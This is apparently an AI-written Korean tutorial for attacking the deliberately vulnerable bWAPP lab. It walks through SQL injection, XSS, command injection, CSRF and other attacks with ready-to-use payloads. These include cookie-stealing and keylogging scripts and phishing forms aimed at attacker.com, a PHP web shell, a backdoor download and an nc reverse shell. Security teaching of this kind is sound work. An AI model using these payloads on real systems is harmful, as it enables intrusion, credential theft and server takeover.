Please continue.

완벽합니다! 이제 상세한 실습 강의 자료를 작성하겠습니다.

---

# 📚 bWAPP 웹 취약점 실습 강의 자료

## 목차
1. [Docker 환경 구축](#1-docker-환경-구축)
2. [실습 예제 10가지](#2-실습-예제-10가지)

---

## 1. Docker 환경 구축

### 1.1 사전 준비사항
```bash
# Docker 설치 확인
docker --version

# Docker가 없다면 설치
sudo apt update
sudo apt install docker.io -y
```

### 1.2 bWAPP 컨테이너 설치 및 실행

```bash
# 1단계: Docker 이미지 다운로드
docker pull hackersploit/bwapp-docker

# 2단계: 컨테이너 실행 (포트 80번 사용)
docker run -d -p 80:80 hackersploit/bwapp-docker

# 3단계: 컨테이너 실행 확인
docker ps
```

### 1.3 bWAPP 초기 설정

```bash
# 브라우저에서 접속
http://127.0.0.1/install.php
```

1. **[Install bWAPP]** 버튼 클릭
2. 성공 메시지 확인 후 로그인 페이지로 이동
3. 기본 계정으로 로그인:
   - **Username**: `bee`
   - **Password**: `bug`

### 1.4 실습 환경 설정

로그인 후 페이지 상단에서:
- **보안 레벨 선택**: `low` / `medium` / `high`
- **취약점 선택**: 드롭다운 메뉴에서 실습할 취약점 선택
- **Hack** 버튼 클릭으로 실습 페이지 이동

---

## 2. 실습 예제 10가지

---

## 🎯 예제 1: SQL Injection (GET/Search)

### 📖 학습 목표
검색 파라미터를 통한 SQL Injection 공격으로 데이터베이스 정보 탈취

### 🔧 실습 단계

#### Step 1: 취약점 메뉴 선택
```
Choose your bug → SQL Injection (GET/Search) → Security Level: Low
```

#### Step 2: 취약점 탐지
```
입력값: iron'
결과: SQL 에러 발생 확인 → 취약점 존재 확인
```

#### Step 3: 기본 공격 - 모든 영화 정보 조회
```sql
페이로드: ' OR '1'='1
설명: WHERE 조건을 항상 참으로 만들어 모든 레코드 조회
```

#### Step 4: UNION 공격 - 컬럼 개수 찾기
```sql
페이로드 1: ' ORDER BY 1--
페이로드 2: ' ORDER BY 2--
페이로드 3: ' ORDER BY 7--
페이로드 4: ' ORDER BY 8--  (에러 발생 → 7개 컬럼 확인)

설명: ORDER BY 구문으로 컬럼 개수 확인
```

#### Step 5: 데이터베이스 정보 탈취
```sql
# 데이터베이스 버전 확인
페이로드: ' UNION SELECT 1,2,3,4,5,6,7--

# 데이터베이스 이름 확인
페이로드: ' UNION SELECT 1,database(),3,4,5,6,7--

# 사용자 정보 탈취
페이로드: ' UNION SELECT 1,login,password,email,5,6,7 FROM users--

# 테이블 목록 확인
페이로드: ' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()--
```

### 💡 실습 결과
- 모든 사용자의 로그인 정보 획득
- 데이터베이스 구조 파악
- 추가 공격 벡터 식별

---

## 🎯 예제 2: SQL Injection (Login Form)

### 📖 학습 목표
로그인 폼을 통한 인증 우회

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → SQL Injection (Login Form/Hero)
```

#### Step 2: 인증 우회 공격

**방법 1: 주석을 이용한 우회**
```sql
Username: admin' OR '1'='1'--
Password: (아무거나)

설명: 
원래 쿼리: SELECT * FROM users WHERE login='admin' OR '1'='1'--' AND password='...'
주석(--) 이후 무시되어 인증 우회
```

**방법 2: OR 조건 이용**
```sql
Username: ' OR 1=1--
Password: (아무거나)
```

**방법 3: UNION 공격**
```sql
Username: admin' UNION SELECT 1,1,1,1--
Password: (아무거나)
```

### 💡 실습 결과
비밀번호 없이 관리자 계정으로 로그인 성공

---

## 🎯 예제 3: XSS - Reflected (GET)

### 📖 학습 목표
반사형 XSS를 통한 클라이언트 사이드 공격

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → Cross-Site Scripting - Reflected (GET)
```

#### Step 2: 기본 XSS 공격

**Level: Low**
```javascript
// 페이로드 1: 기본 알림창
<script>alert('XSS')</script>

// 페이로드 2: 쿠키 탈취
<script>alert(document.cookie)</script>

// 페이로드 3: 쿠키 외부 전송
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

// 페이로드 4: 페이지 리다이렉트
<script>window.location='http://malicious-site.com'</script>
```

**Level: Medium (script 태그 필터링 우회)**
```html
<!-- SVG 태그 이용 -->
<svg onload=alert(document.cookie)>

<!-- IMG 태그 이용 -->
<img src=x onerror=alert(document.cookie)>

<!-- BODY 태그 이용 -->
<body onload=alert('XSS')>

<!-- Iframe 이용 -->
<iframe src="javascript:alert('XSS')">
```

#### Step 3: 고급 페이로드

```javascript
// 키로거 삽입
<script>
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/log.php?key=' + e.key, true);
    xhr.send();
}
</script>

// 세션 하이재킹
<script>
fetch('http://attacker.com/steal.php', {
    method: 'POST',
    body: JSON.stringify({cookie: document.cookie})
});
</script>
```

### 💡 실습 결과
- 사용자 브라우저에서 임의 스크립트 실행
- 쿠키 및 세션 정보 탈취 가능성 확인

---

## 🎯 예제 4: XSS - Stored (Blog)

### 📖 학습 목표
저장형 XSS를 통한 지속적인 공격

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → Cross-Site Scripting - Stored (Blog)
```

#### Step 2: 저장형 XSS 공격

**Level: Low**
```javascript
// 댓글 입력란에 삽입
<script>alert(document.cookie)</script>

// 이미지 태그 이용
<img src=x onerror=alert('Stored XSS')>

// 지속적인 쿠키 전송
<script>
setInterval(function(){
    new Image().src = 'http://attacker.com/log.php?c=' + document.cookie;
}, 5000);
</script>
```

**Level: Medium**
```html
<!-- SVG 이용 -->
<svg onload=alert(document.cookie)>

<!-- Marquee 태그 이용 -->
<marquee onclick=alert(document.cookie)>Click me!</marquee>

<!-- Details 태그 이용 -->
<details open ontoggle=alert('XSS')>
```

#### Step 3: 악성 행동 유도

```javascript
// 피싱 폼 삽입
<div id="fake-login">
<h3>Session Expired - Please Login Again</h3>
<form action="http://attacker.com/phish.php" method="POST">
    Username: <input name="user"><br>
    Password: <input name="pass" type="password"><br>
    <input type="submit" value="Login">
</form>
</div>
```

### 💡 실습 결과
- 모든 방문자에게 영향을 미치는 공격 구현
- 지속적인 정보 탈취 가능

---

## 🎯 예제 5: HTML Injection - Reflected (GET)

### 📖 학습 목표
HTML 태그 삽입을 통한 페이지 조작

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → HTML Injection - Reflected (GET)
```

#### Step 2: HTML 삽입 공격

**기본 HTML 삽입**
```html
<!-- 제목 변경 -->
<h1 style="color:red;">HACKED!</h1>

<!-- 가짜 경고 메시지 -->
<div style="background:red;color:white;padding:20px;">
    <h2>⚠️ SECURITY ALERT!</h2>
    <p>Your account has been compromised!</p>
</div>

<!-- 이미지 삽입 -->
<img src="http://malicious-site.com/fake-logo.png" width="500">

<!-- 전체 페이지 덮어쓰기 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <h1>Site Under Maintenance</h1>
</div>
```

**피싱 폼 삽입**
```html
<form action="http://attacker.com/steal.php" method="POST">
    <h3>Update Your Password</h3>
    Old Password: <input type="password" name="old"><br>
    New Password: <input type="password" name="new"><br>
    <input type="submit" value="Update">
</form>
```

### 💡 실습 결과
사용자에게 가짜 콘텐츠 표시하여 정보 탈취

---

## 🎯 예제 6: Directory Traversal

### 📖 학습 목표
파일 경로 조작을 통한 시스템 파일 접근

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → Directory Traversal - Directories
```

#### Step 2: 경로 탐색 공격

**기본 공격**
```bash
# Linux 시스템 파일 접근
../../../../../etc/passwd
../../../../../etc/hosts
../../../../../etc/shadow

# 다양한 인코딩 시도
..%2F..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
..\/..\/..\/..\/etc/passwd
```

**Windows 대상 공격**
```bash
..\..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\..\boot.ini
..\..\..\..\..\windows\win.ini
```

**NULL Byte 우회**
```bash
../../../../../etc/passwd%00
../../../../../etc/passwd%00.jpg
```

### 💡 실습 결과
- 시스템 파일 내용 확인
- 민감한 정보 노출

---

## 🎯 예제 7: OS Command Injection

### 📖 학습 목표
운영체제 명령어 실행을 통한 서버 제어

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → OS Command Injection
```

#### Step 2: 명령어 삽입 공격

**기본 명령어 실행**
```bash
# 세미콜론으로 명령어 체이닝
127.0.0.1; ls -la

# AND 연산자 사용
127.0.0.1 && whoami

# OR 연산자 사용
127.0.0.1 || cat /etc/passwd

# 파이프 사용
127.0.0.1 | id
```

**정보 수집 명령어**
```bash
# 시스템 정보
; uname -a

# 사용자 정보
; cat /etc/passwd

# 현재 디렉토리
; pwd

# 네트워크 정보
; ifconfig

# 프로세스 확인
; ps aux
```

**악성 행위**
```bash
# 파일 생성
; echo "<?php system($_GET['cmd']); ?>" > /var/www/html/shell.php

# 파일 다운로드
; wget http://attacker.com/backdoor.sh -O /tmp/backdoor.sh

# 리버스 쉘
; nc attacker.com 4444 -e /bin/bash
```

### 💡 실습 결과
서버에서 임의의 시스템 명령어 실행 가능

---

## 🎯 예제 8: CSRF (Change Password)

### 📖 학습 목표
사용자 모르게 비밀번호 변경 요청 실행

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → Cross-Site Request Forgery (Change Password)
```

#### Step 2: 정상 요청 분석

```
Burp Suite로 비밀번호 변경 요청 캡처:

POST /bWAPP/csrf_1.php HTTP/1.1
password_new=test123&password_conf=test123&action=change
```

#### Step 3: CSRF 공격 페이지 작성

**방법 1: 자동 전송 폼**
```html
<!-- csrf_attack.html -->
<html>
<body onload="document.getElementById('csrf').submit()">
<form id="csrf" action="http://localhost/bWAPP/csrf_1.php" method="POST">
    <input type="hidden" name="password_new" value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
    <input type="hidden" name="action" value="change">
</form>
</body>
</html>
```

**방법 2: 이미지 태그 이용 (GET 방식)**
```html
<img src="http://localhost/bWAPP/csrf_1.php?password_new=hacked&password_conf=hacked&action=change">
```

**방법 3: JavaScript 자동 실행**
```javascript
<script>
fetch('http://localhost/bWAPP/csrf_1.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'password_new=hacked123&password_conf=hacked123&action=change',
    credentials: 'include'
});
</script>
```

### 💡 실습 결과
사용자가 링크를 클릭하면 자동으로 비밀번호 변경

---

## 🎯 예제 9: Insecure Direct Object Reference (IDOR)

### 📖 학습 목표
객체 참조 값 조작으로 타인의 정보 접근

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → Insecure DOR (Change Secret)
```

#### Step 2: 정상 요청 확인

```
정상 URL:
http://localhost/bWAPP/insecure_direct_object_ref_1.php?login=bee
```

#### Step 3: IDOR 공격

**사용자 파라미터 변조**
```bash
# 다른 사용자 정보 조회
http://localhost/bWAPP/insecure_direct_object_ref_1.php?login=admin
http://localhost/bWAPP/insecure_direct_object_ref_1.php?login=A.I.M.
http://localhost/bWAPP/insecure_direct_object_ref_1.php?login=pablo

# Burp Suite Intruder로 자동화
bee → admin, user1, user2, test, administrator...
```

**POST 요청 변조**
```http
POST /bWAPP/insecure_direct_object_ref_2.php HTTP/1.1

login=admin&secret=NewSecret&action=change
```

### 💡 실습 결과
다른 사용자의 비밀번호나 민감 정보 변경 가능

---

## 🎯 예제 10: Session Management (Broken Auth)

### 📖 학습 목표
취약한 세션 관리를 통한 계정 탈취

### 🔧 실습 단계

#### Step 1: 메뉴 선택
```
Choose your bug → Broken Auth. - Weak Login
```

#### Step 2: 약한 비밀번호 공격

**일반적인 비밀번호 시도**
```
Username: admin
Passwords:
- password
- admin
- 123456
- admin123
- password123
- letmein
- welcome
- monkey
- 1234
```

#### Step 3: Hydra를 이용한 자동화 공격

```bash
# 사용자 리스트 생성
echo -e "admin\nbee\nuser\ntest" > users.txt

# 비밀번호 리스트 생성
echo -e "password\nadmin\n123456\nbug" > passwords.txt

# Hydra 실행
hydra -L users.txt -P passwords.txt localhost http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^:Invalid credentials"
```

#### Step 4: 세션 고정 공격

```javascript
// 공격자가 생성한 세션 ID를 피해자에게 전달
http://localhost/bWAPP/login.php?PHPSESSID=attacker_session_id

// 피해자가 로그인하면 공격자도 동일 세션으로 접근 가능
```

### 💡 실습 결과
- 취약한 비밀번호로 계정 탈취
- 세션 관리 취약점 이해

---

## 📊 실습 도구 추천

### Burp Suite 설정
```bash
# Kali Linux에 기본 설치
burpsuite

# 프록시 설정: 127.0.0.1:8080
# 브라우저에서 프록시 설정 후 HTTP 요청 캡처
```

### OWASP ZAP 사용
```bash
# ZAP 실행
zaproxy

# Automated Scan으로 자동 취약점 스캔
```

### SQLMap 자동화
```bash
# GET 파라미터 테스트
sqlmap -u "http://localhost/bWAPP/sqli_1.php?title=test&action=search" --dbs

# POST 파라미터 테스트
sqlmap -u "http://localhost/bWAPP/sqli_6.php" --data="title=test" --dump

# 쿠키 포함
sqlmap -u "http://localhost/bWAPP/sqli_1.php" --cookie="PHPSESSID=xxx;security_level=0"
```

---

## 🛡️ 방어 기법

### SQL Injection 방어
```php
// Prepared Statement 사용
$stmt = $pdo->prepare("SELECT * FROM users WHERE login = :login");
$stmt->execute(['login' => $login]);
```

### XSS 방어
```php
// HTML 인코딩
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// Content Security Policy 헤더
header("Content-Security-Policy: default-src 'self'");
```

### CSRF 방어
```php
// CSRF 토큰 생성
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// 요청 시 토큰 검증
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

---

## 📝 실습 체크리스트

각 예제를 완료하면 체크하세요:

- [ ] 예제 1: SQL Injection (GET/Search)
- [ ] 예제 2: SQL Injection (Login Form)
- [ ] 예제 3: XSS - Reflected (GET)
- [ ] 예제 4: XSS - Stored (Blog)
- [ ] 예제 5: HTML Injection
- [ ] 예제 6: Directory Traversal
- [ ] 예제 7: OS Command Injection
- [ ] 예제 8: CSRF
- [ ] 예제 9: IDOR
- [ ] 예제 10: Session Management

---

## 🔗 추가 학습 리소스

- **bWAPP 공식 사이트**: http://www.itsecgames.com/
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **HackTheBox**: https://www.hackthebox.eu/

---

## ⚠️ 주의사항

1. **합법적 환경에서만 실습**: 본인 소유의 시스템이나 허가받은 환경에서만 테스트
2. **격리된 환경 사용**: Docker 컨테이너나 VM으로 격리된 환경 구축
3. **외부 노출 금지**: 취약한 애플리케이션을 인터넷에 노출하지 않기
4. **실습 후 정리**: 컨테이너 종료 및 삭제

```bash
# 컨테이너 종료
docker stop $(docker ps -q --filter ancestor=hackersploit/bwapp-docker)

# 컨테이너 삭제
docker rm $(docker ps -aq --filter ancestor=hackersploit/bwapp-docker)
```

---

**이 강의 자료로 실전 웹 보안 실력을 키워보세요! 🚀**
